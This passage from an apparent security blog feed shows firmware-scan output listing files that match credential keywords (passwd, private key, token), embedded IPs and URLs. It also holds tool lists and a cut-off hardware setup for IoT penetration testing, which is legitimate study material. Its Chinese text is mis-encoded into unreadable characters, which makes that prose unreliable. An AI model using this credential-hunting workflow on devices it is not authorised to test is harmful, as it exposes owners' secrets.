â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;losetup.util-linux<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;tr069&#x2F;param.xml<br>t&#x2F;etc&#x2F;tr069&#x2F;igd_10.xml<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account_Help.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.control<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>â€”â€”â€”â€”â€”â€”â€“ passwd â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;vipw.shadow<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;amgrevt<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libnss_compat.so.2<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libnss_files.so.2<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mountall.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mdev.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;router.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;tinylogin.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;task-core-boot.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>â€”â€”â€”â€”â€”â€”â€“ pwd â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;pwd</p><p>â€”â€”â€”â€”â€”â€”â€“ dropbear â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postrm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>â€”â€”â€”â€”â€”â€”â€“ ssl â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libcrypto1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libssl1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.list</p><p>â€”â€”â€”â€”â€”â€”â€“ private key â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;agent</p><p>â€”â€”â€”â€”â€”â€”â€“ telnet â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>â€”â€”â€”â€”â€”â€”â€“ secret â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;dhcp6s<br>t&#x2F;bin&#x2F;dhcp6c</p><p>â€”â€”â€”â€”â€”â€”â€“ pgp â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;lib&#x2F;libresolv.so.2</p><p>â€”â€”â€”â€”â€”â€”â€“ gpg â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>â€”â€”â€”â€”â€”â€”â€“ token â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;iwconfig<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;ld-linux.so.3<br>t&#x2F;lib&#x2F;libsqlite3.so.0<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;lib&#x2F;libpcap.so.1<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Firewall.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_WLAN.html</p><p>â€”â€”â€”â€”â€”â€”â€“ api key â€”â€”â€”â€”â€”â€”â€“</p><p>â€”â€”â€”â€”â€”â€”â€“ oauth â€”â€”â€”â€”â€”â€”â€“</p><p><em><strong>Search for web servers</strong></em><br>##################################### search for web servers<br>##################################### apache</p><p>##################################### lighttpd</p><p>##################################### alphapd</p><p>##################################### httpd<br>t&#x2F;sbin&#x2F;httpd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;httpd</p><p><em><strong>Search for important binaries</strong></em><br>##################################### important binaries<br>##################################### ssh<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;ssh</p><p>##################################### sshd</p><p>##################################### scp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;scp</p><p>##################################### sftp</p><p>##################################### tftp<br>t&#x2F;bin&#x2F;tftp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;tftp</p><p>##################################### dropbear<br>t&#x2F;etc&#x2F;dropbear<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear</p><p>##################################### busybox<br>t&#x2F;bin&#x2F;busybox</p><p>##################################### telnet<br>t&#x2F;bin&#x2F;telnet<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>##################################### telnetd<br>t&#x2F;sbin&#x2F;telnetd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnetd</p><p>##################################### openssl</p><p><em><strong>Search for ip addresses</strong></em><br>##################################### ip addresses<br>0.0.0.0<br>127.0.0.1<br>1.4.12.1<br>169.254.0.0<br>169.254.255.255<br>192.168.0.0<br>192.168.0.1<br>192.168.0.20<br>192.168.0.40<br>192.168.1.0<br>192.168.10.1<br>192.168.10.109<br>192.168.1.1<br>192.168.1.20<br>192.168.1.40<br>192.168.1.8<br>192.168.2.1<br>192.168.2.20<br>192.168.2.40<br>192.168.50.1<br>192.168.50.2<br>192.168.7.0<br>192.168.7.1<br>192.168.7.113<br>192.168.7.2<br>224.0.0.0<br>255.255.0.0<br>255.255.255.0<br>255.255.255.255<br>4.1.4.2<br>4.1.4.3<br>88.22.44.13</p><p><em><strong>Search for urls</strong></em><br>##################################### urls<br><a href="http://0pointer.de/">http://0pointer.de</a><br><a href="http://avahi.org/">http://avahi.org</a><br><a href="http://codeaurora.org/">http://codeaurora.org</a><br><a href="http://code.google.com/">http://code.google.com</a><br><a href="http://dbus.freedesktop.org/">http://dbus.freedesktop.org</a><br><a href="http://developer.android.com/">http://developer.android.com</a><br><a href="http://download.savannah.gnu.org/">http://download.savannah.gnu.org</a><br><a href="http://downloads.sourceforge.net/">http://downloads.sourceforge.net</a><br><a href="http://ebtables.sourceforge.net/">http://ebtables.sourceforge.net</a><br><a href="http://expat.sourceforge.net/">http://expat.sourceforge.net</a><br><a href="http://ftp.gnome.org/">http://ftp.gnome.org</a><br><a href="http://kernel.org/">http://kernel.org</a><br><a href="http://linuxwireless.org/">http://linuxwireless.org</a><br><a href="http://matt.ucc.asn.au/">http://matt.ucc.asn.au</a><br><a href="http://miniupnp.free.fr/">http://miniupnp.free.fr</a><br><a href="http://netfilter.org/">http://netfilter.org</a><br><a href="http://packages.debian.org/">http://packages.debian.org</a><br><a href="http://pkg-shadow.alioth.debian.org/">http://pkg-shadow.alioth.debian.org</a><br><a href="http://savannah.nongnu.org/">http://savannah.nongnu.org</a><br><a href="http://sites.google.com/">http://sites.google.com</a><br><a href="http://sourceforge.net/">http://sourceforge.net</a><br><a href="http://support.cdmatech.com/">http://support.cdmatech.com</a><br><a href="http://theory.uwinnipeg.ca/">http://theory.uwinnipeg.ca</a><br><a href="http://tinylogin.busybox.net/">http://tinylogin.busybox.net</a><br><a href="http://wireless.kernel.org/">http://wireless.kernel.org</a><br><a href="http://www.angstrom-distribution.org/">http://www.angstrom-distribution.org</a><br><a href="http://www.busybox.net/">http://www.busybox.net</a><br><a href="http://www.eglibc.org/">http://www.eglibc.org</a><br><a href="http://www.freebsd.org/">http://www.freebsd.org</a><br><a href="http://www.freedesktop.org/">http://www.freedesktop.org</a><br><a href="http://www.gnu.org/">http://www.gnu.org</a><br><a href="http://www.hpl.hp.com/">http://www.hpl.hp.com</a><br><a href="http://www.iana.org/">http://www.iana.org</a><br><a href="http://www.info-zip.org/">http://www.info-zip.org</a><br><a href="http://www.infradead.org/">http://www.infradead.org</a><br><a href="http://www.linuxfoundation.org/">http://www.linuxfoundation.org</a><br><a href="http://www.linux-mtd.infradead.org/">http://www.linux-mtd.infradead.org</a><br><a href="http://www.mylan/">http://www.mylan</a><br><a href="http://www.netfilter.org/">http://www.netfilter.org</a><br><a href="http://www.openssl.org/">http://www.openssl.org</a><br><a href="http://www.quantatw.com/">http://www.quantatw.com</a><br><a href="http://www.tcpdump.org/">http://www.tcpdump.org</a><br><a href="http://www.w3.org/">http://www.w3.org</a><br><a href="http://www.xmlsoft.org/">http://www.xmlsoft.org</a><br><a href="http://www.zlib.net/">http://www.zlib.net</a><br><a href="http://zlib.net/">http://zlib.net</a></p><p><em><strong>Search for emails</strong></em><br>##################################### emails<br><a href="mailto:&#97;&#106;&#x74;&#x40;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#x6f;&#114;&#103;">&#97;&#106;&#x74;&#x40;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#x6f;&#114;&#103;</a><br><a href="mailto:&#98;&#100;&#115;&#99;&#x68;&#117;&#x79;&#x6d;&#x40;&#112;&#x61;&#110;&#x64;&#111;&#x72;&#97;&#46;&#x62;&#101;">&#98;&#100;&#115;&#99;&#x68;&#117;&#x79;&#x6d;&#x40;&#112;&#x61;&#110;&#x64;&#111;&#x72;&#97;&#46;&#x62;&#101;</a><br><a href="mailto:&#66;&#114;&#x75;&#99;&#101;&#x40;&#80;&#x69;&#120;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;">&#66;&#114;&#x75;&#99;&#101;&#x40;&#80;&#x69;&#120;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;</a><br><a href="mailto:&#x62;&#114;&#117;&#x6e;&#x6f;&#x2e;&#114;&#x61;&#110;&#x64;&#x6f;&#x6c;&#102;&#64;&#x34;&#103;&#x2d;&#115;&#x79;&#x73;&#116;&#101;&#x6d;&#x73;&#x2e;&#98;&#105;&#122;">&#x62;&#114;&#117;&#x6e;&#x6f;&#x2e;&#114;&#x61;&#110;&#x64;&#x6f;&#x6c;&#102;&#64;&#x34;&#103;&#x2d;&#115;&#x79;&#x73;&#116;&#101;&#x6d;&#x73;&#x2e;&#98;&#105;&#122;</a><br><a href="mailto:&#100;&#x61;&#103;&#x40;&#x77;&#x69;&#101;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;">&#100;&#x61;&#103;&#x40;&#x77;&#x69;&#101;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;</a><br><a href="mailto:&#100;&#101;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#x6e;&#111;&#x2d;&#x69;&#112;&#x2e;&#x63;&#x6f;&#x6d;">&#100;&#101;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#x6e;&#111;&#x2d;&#x69;&#112;&#x2e;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#109;&#x69;&#113;&#x75;&#101;&#108;&#115;&#64;&#99;&#105;&#115;&#116;&#x72;&#111;&#x6e;&#x2e;&#x6e;&#x6c;">&#109;&#x69;&#113;&#x75;&#101;&#108;&#115;&#64;&#99;&#105;&#115;&#116;&#x72;&#111;&#x6e;&#x2e;&#x6e;&#x6c;</a><br><a href="mailto:&#111;&#112;&#101;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#x64;&#x2d;&#99;&#x6f;&#x72;&#x65;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#x6f;&#112;&#101;&#x6e;&#x65;&#109;&#98;&#101;&#x64;&#100;&#101;&#x64;&#x2e;&#111;&#114;&#103;">&#111;&#112;&#101;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#x64;&#x2d;&#99;&#x6f;&#x72;&#x65;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#x6f;&#112;&#101;&#x6e;&#x65;&#109;&#98;&#101;&#x64;&#100;&#101;&#x64;&#x2e;&#111;&#114;&#103;</a><br><a href="mailto:&#x72;&#111;&#107;&#x2e;&#112;&#x61;&#x70;&#x65;&#122;&#64;&#97;&#x72;&#x6e;&#x65;&#115;&#x2e;&#115;&#x69;">&#x72;&#111;&#107;&#x2e;&#112;&#x61;&#x70;&#x65;&#122;&#64;&#97;&#x72;&#x6e;&#x65;&#115;&#x2e;&#115;&#x69;</a><br><a href="mailto:&#x72;&#112;&#x75;&#x72;&#100;&#105;&#x65;&#x40;&#111;&#x70;&#x65;&#x6e;&#101;&#100;&#x68;&#97;&#110;&#x64;&#x2e;&#99;&#x6f;&#x6d;">&#x72;&#112;&#x75;&#x72;&#100;&#105;&#x65;&#x40;&#111;&#x70;&#x65;&#x6e;&#101;&#100;&#x68;&#97;&#110;&#x64;&#x2e;&#99;&#x6f;&#x6d;</a><br><a href="mailto:&#115;&#x61;&#110;&#100;&#x6d;&#97;&#x6e;&#x40;&#104;&#97;&#110;&#100;&#104;&#x65;&#x6c;&#100;&#x73;&#x2e;&#111;&#114;&#x67;">&#115;&#x61;&#110;&#100;&#x6d;&#97;&#x6e;&#x40;&#104;&#97;&#110;&#100;&#104;&#x65;&#x6c;&#100;&#x73;&#x2e;&#111;&#114;&#x67;</a><br><a href="mailto:&#x73;&#x65;&#x62;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#101;&#115;&#x74;&#x69;&#101;&#x6e;&#110;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x73;&#x65;&#x62;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#101;&#115;&#x74;&#x69;&#101;&#x6e;&#110;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#x73;&#114;&#98;&#64;&#99;&#x75;&#x63;&#105;&#x2e;&#x6e;&#x6c;">&#x73;&#114;&#98;&#64;&#99;&#x75;&#x63;&#105;&#x2e;&#x6e;&#x6c;</a><br><a href="mailto:&#x54;&#105;&#109;&#x40;&#82;&#x69;&#107;&#x65;&#114;&#x73;&#46;&#x6f;&#114;&#103;">&#x54;&#105;&#109;&#x40;&#82;&#x69;&#107;&#x65;&#114;&#x73;&#46;&#x6f;&#114;&#103;</a><br><a href="mailto:&#x77;&#97;&#x6c;&#x74;&#101;&#114;&#x73;&#x40;&#100;&#101;&#x62;&#105;&#97;&#110;&#46;&#x6f;&#114;&#103;">&#x77;&#97;&#x6c;&#x74;&#101;&#114;&#x73;&#x40;&#100;&#101;&#x62;&#105;&#97;&#110;&#46;&#x6f;&#114;&#103;</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOTã€‘ç‰©è”ç½‘æ¸—é€æµ‹è¯•-å·¥å…·è¦æ±‚</title>
    <link href="/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/"/>
    <url>/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<h2 id="å›ºä»¶åˆ†æå·¥å…·"><a href="#å›ºä»¶åˆ†æå·¥å…·" class="headerlink" title="å›ºä»¶åˆ†æå·¥å…·"></a>å›ºä»¶åˆ†æå·¥å…·</h2><ul><li><p>Binwalk</p></li><li><p>Firmadyne</p></li><li><p>Firmwalker</p></li><li><p>Angr</p></li><li><p>firmware-mod-toolkit</p></li><li><p>Firmware Analysis Toolkit</p></li><li><p>GDB</p></li><li><p>Radare2</p></li><li><p>Binary Analysis Toolï¼ˆBATï¼‰</p></li><li><p>Qemu</p></li><li><p>IDA Proï¼ˆå¯é€‰ï¼‰</p></li></ul><h2 id="Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"><a href="#Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·" class="headerlink" title="Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"></a>Webåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·</h2><blockquote><p>Webåº”ç”¨æ¸—é€æµ‹è¯•çš„å¸¸è§å·¥å…·ä¸»è¦åŒ…æ‹¬Burp Suiteå’ŒOWASP ZAPã€‚Burp Suiteæœ‰å…è´¹ç‰ˆå’Œä¸“ä¸šç‰ˆä¹‹åˆ†ï¼Œä¸“ä¸šç‰ˆçš„ä»·æ ¼ä¹Ÿä¸ç®—ç¦»è°±ã€‚è€ŒZAPåˆ™æ˜¯å®Œå…¨å…è´¹å¹¶ä¸”å¼€æºçš„ï¼Œåœ¨éœ€è¦æ§åˆ¶æˆæœ¬çš„æƒ…å†µä¸‹ï¼ŒZAPä¸å¤±ä¸ºä¸€ç§æ¯”è¾ƒå¥½çš„é€‰æ‹©ã€‚åœ¨å¯¹WebæœåŠ¡å’ŒAPIè¿›è¡Œæµ‹è¯•æ—¶ï¼Œè¿˜å¯ä»¥åŠ è½½æ’ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¦å®‰è£…Burp Suiteçš„æ’ä»¶ï¼Œåˆ™éœ€è¦å…ˆè´­ä¹°ä¸“ä¸šç‰ˆã€‚è¿™é‡Œåˆ—å‡ºçš„æ‰€æœ‰å·¥å…·éƒ½æ˜¯è·¨å¹³å°çš„ï¼Œå®ƒä»¬è¦ä¹ˆæ˜¯åŸºäºJavaå¼€å‘çš„ï¼Œè¦ä¹ˆå¯ä»¥å†…ç½®åœ¨æµè§ˆå™¨ä¸­</p></blockquote><ul><li><p>Burp Suite</p></li><li><p>OWASP Zed Attack Proxyï¼ˆZAPï¼‰</p></li><li><p>REST Easy Firefox Plugin</p></li><li><p>Postman Chrome Extension</p></li></ul><h2 id="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"><a href="#ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·" class="headerlink" title="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·"></a>ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul><li>å‘è¡Œç‰ˆAndroidæ¸—é€æµ‹è¯•è™šæ‹Ÿæœºï¼šAndroid SDKã€Android </li><li>Emulator</li><li>Enjarify</li><li>JD-Gui</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><blockquote><p>ç”±äºiOSå¹³å°æ¯”è¾ƒç‰¹æ®Šï¼Œå› æ­¤åœ¨å¼€å§‹æ¸—é€æµ‹è¯•å‰éœ€è¦å‡†å¤‡å¥½OS Xè®¡ç®—æœºå’Œå·²è¶Šç‹±çš„è‹¹æœè®¾å¤‡ã€‚å¦‚æœä¸æ»¡è¶³è¿™ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•å¯¹iOSåº”ç”¨å¼€å±•æ¸—é€æµ‹è¯•çš„ã€‚ä¸‹é¢æ˜¯å¯¹iOSåº”ç”¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ç”¨åˆ°çš„éƒ¨åˆ†å·¥å…·ã€‚</p></blockquote><p>ä¸‹é¢åˆ—å‡ºçš„æ˜¯éœ€è¦åœ¨OS Xè®¡ç®—æœºä¸Šå®‰è£…çš„iOSåº”ç”¨æ¸—é€æµ‹è¯•å·¥å…·å’Œå®‰å…¨è¯„ä¼°å·¥å…·ï¼š</p><ul><li>idb</li><li>Xcode Tools</li><li>Class-Dump</li><li>Hopperï¼ˆå¯é€‰ï¼‰</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><p>ä¸‹é¢åˆ—å‡ºçš„æ˜¯ä¸ºå¼€å±•æ¸—é€æµ‹è¯•éœ€è¦å®‰è£…åœ¨è¶Šç‹±è®¾å¤‡ä¸Šçš„è½¯ä»¶ï¼š</p><ul><li>Cydia</li><li>openURL</li><li>dumpdecrypted</li><li>ipainstaller</li><li>SSL Kill Switch 2</li><li>Clutch2</li><li>Cycript</li></ul><h2 id="æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚"><a href="#æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚" class="headerlink" title="æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚"></a>æ— çº¿ç”µåˆ†æå·¥å…·éœ€æ±‚</h2><h3 id="æ— çº¿ç”µåˆ†æç¡¬ä»¶"><a href="#æ— çº¿ç”µåˆ†æç¡¬ä»¶" class="headerlink" title="æ— çº¿ç”µåˆ†æç¡¬ä»¶"></a>æ— çº¿ç”µåˆ†æç¡¬ä»¶</h3><p>ä¸‹é¢åˆ—å‡ºäº†ç”¨äºåˆ†ææ— çº¿ç”µé¢‘è°±çš„ç¡¬ä»¶è®¾å¤‡ï¼š</p><ul><li>Atmel RZ Raven USBè®¾å¤‡ï¼ˆKillerBeeæ”»å‡»æ¡†æ¶ï¼‰</li><li>Attify Badge[1]ï¼ˆæˆ–è€…C232HM-DDHSL-0çº¿ç¼†åŒAdafruit FTDI Breakoutå¼€å‘æ¿çš„æ­é…ï¼‰</li><li>HackRF One</li><li>Yardstick One</li><li>å¸¦æœ‰Xbee Shieldæ¨¡å—çš„XBeeæ‰©å±•æ¿</li><li>Ubertooth</li><li>BLeé€‚é…å™¨</li></ul><h3 id="æ— çº¿ç”µåˆ†æè½¯ä»¶"><a href="#æ— çº¿ç”µåˆ†æè½¯ä»¶" class="headerlink" title="æ— çº¿ç”µåˆ†æè½¯ä»¶"></a>æ— çº¿ç”µåˆ†æè½¯ä»¶</h3><ul><li>KillerBeeæ¡†æ¶</li><li>Attify ZigBeeæ¡†æ¶</li><li>GNU Radio</li><li>BLEAH</li><li>GQRX</li><li>Ubertooth tools</li><li>Blue Hydra</li><li>RTL-sdr</li><li>Hackrf packages</li><li>EZ-Wave</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT PWNã€‘ ç¯å¢ƒæ­å»º</title>
    <link href="/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¡¬ä»¶èµ„æº"><a href="#ç¡¬ä»¶èµ„æº" class="headerlink" title="ç¡¬ä»¶èµ„æº"></a>ç¡¬ä»¶èµ„æº</h2><p>å¤ªå¤šè¾£ï¼Œä»¥åçœ‹éœ€æ±‚æ…¢æ…¢è´­å…¥å§</p><ul><li>ä¸‡ç”¨è¡¨ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯ç”¨æ¥æµ‹è¯•UART(TLL)ä¸­çš„å‡ ä¸ªæ¥å£ï¼Œæ¯”å¦‚<code>RX</code>ã€<code>TX</code>ã€<code>GND</code>ã€‚</li><li>CH340Gè®¾å¤‡(USBè½¬TTL)ï¼Œè¿™ä¸ªè®¾å¤‡ä¸»è¦çš„å°†ç”µè„‘ä¸IoTè®¾å¤‡ç”¨TTLçº¿è¿æ¥ï¼Œæ–¹ä¾¿è¿›å…¥IoTè®¾å¤‡çš„ç»ˆç«¯(Shell)ã€‚</li><li>ç”µçƒ™é“ï¼Œè¿™é‡Œä¹°ç”µçƒ™é“çš„ä¸»è¦ç”¨é€”æ˜¯ç„Šæ¥UARTæ¥å£çš„é’ˆè„šã€‚</li><li>ç„Šé”¡ä¸</li><li>é’ˆè„šï¼Œé’ˆè„šä¸»è¦ç”¨æ¥ç„Šæ¥UARTæ¥å£</li><li>ç¼–è¾‘å™¨ï¼Œç¼–ç¨‹å™¨ä¸»è¦æ˜¯ç”¨æ¥å¸®åŠ©æˆ‘ä»¬dump 